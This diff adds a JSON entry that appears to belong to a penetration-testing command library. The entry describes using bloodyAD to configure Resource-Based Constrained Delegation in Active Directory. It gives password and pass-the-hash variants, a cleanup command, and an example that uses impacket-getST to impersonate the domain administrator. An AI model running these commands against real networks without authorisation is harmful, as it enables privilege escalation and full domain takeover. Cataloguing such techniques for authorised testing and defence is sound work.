@@ -1,0 +1,22 @@
+{
+  "id": "bloodyad-rbcd",
+  "name": "bloodyAD Set RBCD",
+  "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add rbcd <target_computer> <controlled_computer$>",
+  "description": "Configure Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer to allow a controlled machine account to S4U2Self/S4U2Proxy as any user against it. Classic privesc when you have GenericWrite on a server and a machine account (e.g. via add-computer + MAQ).",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["bloodyad", "rbcd", "delegation", "s4u", "privesc"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> add rbcd <target_computer> <controlled_computer$>" },
+    { "label": "Cleanup", "requires": "password", "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> remove rbcd <target_computer> <controlled_computer$>" }
+  ],
+  "references": [
+    { "title": "bloodyAD docs", "url": "https://github.com/CravateRouge/bloodyAD/wiki" },
+    { "title": "The Hacker Recipes — RBCD", "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" }
+  ],
+  "examples": [
+    "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add rbcd 'TARGET$' 'PWNED$'",
+    "impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator 'corp.local/PWNED$:ComputerPass123!'"
+  ]
+}
